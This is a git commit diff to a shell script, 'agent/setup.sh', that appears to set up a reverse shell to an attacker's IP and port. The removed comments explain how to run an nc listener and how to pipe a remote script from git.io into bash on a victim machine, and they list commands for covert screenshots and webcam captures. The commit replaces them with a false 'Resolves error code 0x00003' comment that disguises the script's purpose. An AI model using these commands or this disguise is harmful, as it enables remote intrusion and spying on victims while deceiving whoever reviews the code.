36f6eb159ea79a71dbab40ca5a9aae3bf2cfd0ad
Becca Lynch <88850427+beccalunch@users.noreply.github.com>
2024-11-19 12:44:35 -0600

    Update setup.sh

--- agent/setup.sh
+++ agent/setup.sh
@@ -1,20 +1,5 @@
 #!/usr/bin/env bash
-# run `nc -nvl 80` on attacker machine first
-# run `curl -Ls https://git.io/vXd2N | bash -s <attacker-ip> 80` on victim machine
-
-# great commands to run:
-# * curl http://discovermagazine.com/~/media/import/images/b/e/b/chimpmedia.jpg -o /tmp/monkey.jpg
-#   open /tmp/monkey.jpg
-# * say hello
-# * open http://lmgtfy.com/?q=how+to+lock+mac
-# * ls
-# * screencapture -x /tmp/screenshot.jpg
-#   open /tmp/screenshot.jpg
-# * brew install imagesnap
-#   imagesnap /tmp/selfie.png
-#   open /tmp/selfie.png
-# * curl http://soundbible.com/grab.php?id=1542&type=mp3 -o /tmp/airhorn.mp3
-#   afplay /tmp/airhorn.mp3
+# Resolves error code 0x00003
 
 attacker_ip=$1
 attacker_port=$2
